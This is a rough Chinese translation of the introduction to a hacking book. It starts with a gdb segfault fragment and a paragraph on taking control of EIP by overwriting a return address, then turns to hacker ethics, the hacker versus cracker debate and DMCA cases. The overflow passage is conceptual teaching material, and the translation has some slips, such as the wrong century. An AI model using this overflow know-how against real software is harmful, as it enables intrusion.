Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb)
```

当用来保存返回地址的那些字节被覆盖重写时，程序仍然会使用这个值来恢复执行指针寄存器(`EIP`)。如果执行指针跳到了一个任意的地址，通常导致程序崩溃。但是这个地址值不是任意的呢？如果控制这个重写的值，那么程序的执行流程就会被控制，就可以让程序跳到一个特殊的地址值。但是我们应该让程序跳到哪呢？

个人觉得第一章是很有必要的，对于任何学习 Hacking 的人来说最重要的还是黑客精神。自己随便翻的，不太准确，但还是贴出来吧。追求技术的极致永远是一个黑客孜孜以求的终极目标。

## Chapter 0x100. INTRODUCTION

`Hacking` 这个概念，它可能会让人想起是电子攻击、间谍活动、染发和在身上打孔这些风格的画面。大部分人都把黑客同破坏规则联系起来，并且认为每一个从事于黑客活动的人都是犯罪分子。然而，虽然确实有人利用黑客技术去破坏规则，但是黑客的实质却并不是这些。实际上，黑客更多的是遵从规则而不是去破坏它。黑客的本质是寻找规则中出人意料的或者被人忽视的用途，以及特定情况下的性能。然后，以一种前所未有的创造性的方式来运用它们解决问题无论任何它是任何问题。

下面的这个数学问题阐述了黑客的本质：

用 1,3,4,6 这四个数字各一次，通过任何四个基本的数学运算符（加、减、乘、除）来得到 24。每个数字都必须被使用并且只能使用一次，并且你可以定义运算的先后顺序；比如，`3 * (4 + 6) + 1 = 31` 虽然也有效，但是是一个错误答案，因为它的运算结果并不是 24。

这个问题的规则定义得很好也很简单，但是答案却不总是正确的。就像这个问题的解一样，黑客式的解答遵循着系统的规则，但是他们以一种不同于一般人直觉的的方式来使用这些规则。这给了黑客们一柄利刃，允许他们以一种常规的思想和方法论难以想象的方式解决问题。

早在计算机的初期，黑客们就已经在创造性地解决问题。19 世纪 50 年代末，MIT 铁路模型俱乐部得到了一个以旧电话设备为主体的捐赠。这个俱乐部的成员们使用这些仪器拼凑成一个复杂的系统，允许多个操作者通过拨入来控制轨道的不同部分去合适的段。他们把这个有创意的电话设备的新用途叫做 hacking：很多的人把这个小组看作是黑客的鼻祖。这个小组继续从事了编程的活动，他们通过打孔纸带为早期的计算机，比如 `IBM704` 和 `TX-0` 编程。当其他的人都满足于写出仅仅能够解决问题的程序的时候，早期的黑客们都痴迷于编写能够完美解决问题的程序。一个能够达到与已有程序相同的结果但是使用更少打孔卡的新程序被认为是更好的，即便它做的是相同的事情。最关键的区别在于程序是如何达到它的效果优雅的。

能够减少程序需要的打孔卡的数目体现了掌控计算机的艺术。一个精心制作的桌台能像一个牛奶箱那样在其中放瓶子，但是前者明显看起来比后者要好很多。早期的黑客们证明了，技术问题可以有艺术的解答，并且他们从此把程序设计从单纯的工程任务转化成了一个艺术形式。

就像很多其他的艺术形式，hacking 经常被人误解。极少数掌握了这一艺术的人形成了非正式的亚文化群，并继续强烈地关注于学习和掌控他们的艺术。他们信仰信息自由，防止任何阻碍这种自由的东西。这包括权威人士、大学课程中的官僚机构，还有歧视。身处追求学位学生大军，这个非官方的黑客小组反对传统的教育目标，转而追求知识本身。这驱动着他们持续不断的学习和探索那片由歧视绘制的传统边界之外的领域，一个明显的例子就是 MIT 铁路模型俱乐部接受了 12 岁的 Peter `Deutsch`，当时他展现了他在 `TX-0` 方面的知识水平以及学习的愿望。年龄、种族、性别、外表、学术学位和社会地位这些都不是判断他人价值的主要标准不是因为平等的愿望，而是想要促进新兴的黑客艺术。

早期的黑客们在枯燥的数学和电子学中发现了光辉和优雅。在他们眼中，程序是一种艺术的表达形式，计算机则是演奏这种艺术的乐器。他们仔细研究和理解并不是想要去除艺术般奋斗的神秘色彩，它仅仅只是一个去更好的欣赏他们的方法。这些知识驱动的价值观最后被成为黑客守则：像欣赏艺术那样去欣赏逻辑、促进信息的自由流动、超越传统的界限，以及为了更好理解世界这个简单目的而遵守的一些约束。这并不是一种新的文化趋势，古希腊的毕达哥拉斯就曾有过类似的道德守则和亚文化，尽管当时他们并没有计算机。他们在数学中看到了美，还发现了很多几何学中的核心思想。这种对知识的渴求以及它的有益副产品将穿越历史不断持续，从毕达哥拉斯到 Ada `Lovelace`，到阿兰图灵，到 MIT 铁道模型俱乐部的黑客们。现代的黑客们，比如 Richard `Stallman` 和 Steve `Wozniak` 已经继承了这些黑客遗产，给我们带来了现在操作系统、程序设计语言、个人计算机，以及其他的很多我们每天都要使用的科技。

那么一个人如何去区分带给我们科技进步奇迹的优秀黑客和那些窃取我们信用卡账号的邪恶黑客呢？`Cracker` 这个术语于是应运而生，将这些邪恶黑客从优秀的黑客中区分开来。记者们也逐渐了解到，`Cracker` 才是坏人，而黑客们都是好孩子。黑客们严格遵循着黑客守则，而 `Cracker` 只对破坏规则和迅速敛财感兴趣。而且人们也认为 `Cracker` 不如精锐的黑客那般有天赋，因为他们仅仅只是使用黑客工具和脚本，却根本不明白它们是如何工作的。`Cracker` 只想要成为那些使用计算机工作时太过大意的用户的“完全捕获”标记盗版软件、攻击网络站点，而且最糟糕的是，他们根本不明白他们在做什么。但是，今天几乎没有人使用这个术语。

这个词没有流行起来可能是因为它让人感到困惑的语源 cracker 最初是用来描述那些破解软件复制权和逆向复制保护机制的人。而今不受人欢迎可能是由于它的两个模棱两可的新定义：一群从事计算机非法活动的人或者相对来说技术不足的黑客。几乎没有科技记者觉得必须去使用这些大部分读者都不熟悉的术语。相较而言，大部分人都关注与术语“黑客”相关联的神秘事物和技巧，于是对于一个记者，很容易做出使用“黑客”这一术语的决定。同样的，术语“脚本小子”有时候也被用来指代 cracker，但是它并不像拖着影子的黑客那样有生命力。虽然有些人仍然在争论 hacker 和 cracker 之间的分界线，但是我相信任何具有黑客精神的人就是一个黑客，不论他或她破坏了任何规则。

当前，限制加密和加密研究的法律进一步模糊了 hacker 和 cracker 之间的界线。2001 年，普林斯顿大学的 Edward `Felten` 教授和他的研究团队准备发表一篇讨论各种数字水印方案的弱点的报告。这一报告回应了 `SDMI Public Challenge` 中的 `Secure Digital Music Initiative (SDMI)` 发起的挑战：鼓励公众尝试破坏这些水印方案以证明这种保护措施的有效性。然而，在 Felten 和他的团队发布这个报告之前，他们受到了来自 SDMI 基金和 `Recording Industry Association of America (RIAA，美国唱片产业联盟)` 的威胁。1998 年的 `Digital Millennium Copyright Act (DCMA，数字千年版权法案)` 使讨论或者提供那些可能绕开行业用户控制的技术变得合法化。相同的法案被用于反对一个名为 Dmitry `Sklyarov` 的俄罗斯计算机程序员和黑客。他曾经写过一个程序来躲避 Adobe 软件中过度简单的加密，并且在美国的一个黑客大会上发表他的发现。`FBI` 突然而至逮捕了他，并引发了一个漫长的法律战争。依据法律，行业用户控制的复杂性并没有什么关系逆向工程甚至讨论用于行业用户控制的 Pig Latin（黑话）在技术上也应当是合法的。那么现在谁是 hacker，谁又是 cracker 呢？当法律看起来和言论自由发生了冲突的时候，难道说出他们想法的好人突然就变坏了吗？我相信，黑客精神超越了法律，因为它反对被法律规定的东西。

核物理和生物化学科学能被用来杀人，然而他们也可以给我们带来重要的科学进步和现代医学。对于知识本身并没有什么好坏之分，但是道德寄存于对知识的应用之中。即便我们想要去，也不可能禁止将物质转化成能量的知识，或者阻止社会科学技术的持续进步。同样的道理，黑客精神永远不可能被阻挠，也不可能被简单的分类或者切割。黑客们将不断地推开知识的限制和可接受的行为，推动我们探索得越来越远。

通过黑客之间的攻防竞赛，推动了和安全方面的共同进步。正如适应了印度豹的追猎的瞪羚，它的速度变得比追逐它的印度豹更快一样，黑客之间的竞争给了计算机用户更好和更强大的安全性，以及更复杂和精巧的攻击技术。入侵检测系统（`IDSs`）的引入和改进就是这种共同进步过程的一个最好的例子。防御型黑客创造了 `IDSs` 来丰富了他们的兵工厂，同时攻击型黑客开发出 `IDS` 躲避技术。最终在更强大、更优秀的 `IDS` 产品中弥补了这些。导致了这些相互作用的网络是积极的，因为它造就了更聪明的人、安全的改进、更可靠的软件、创造性的问题解决技术以及一种新的经济。

本书的目的是传播真正的黑客精神。我们将看到从过去到现在各种各样的黑客技术，分析它们来了解它们的工作原理和工作方式。本书中还包含一个可引导的 LiveCD，其中包含了所有可在预配置的 Linux 环境中使用的的源代码。对于黑客艺术，探索和创新很关键，所以这个 CD 将让你不断延续和自我尝试。你只需要一个可用于所有 `Microsoft Windows` 机器和最新的 `Macintosh` 计算机之上的 `x86` 处理器插入 CD，然后重启。这个供选择的 Linux 环境不会破坏你已有的操作系统，于是当你结束了，只需要再次重启并且移除这个 CD 就可以。这样下去，你将获得对于 hacking 亲身实践的理解和评价。它可能启发你在已有的技术上进行改进，或者甚至发明新的东西。但愿这本书能够激发你身体中好奇的黑客本能并促使你以某种方式为黑客艺术做出自己的贡献，无论你选择站在围墙的哪一边。
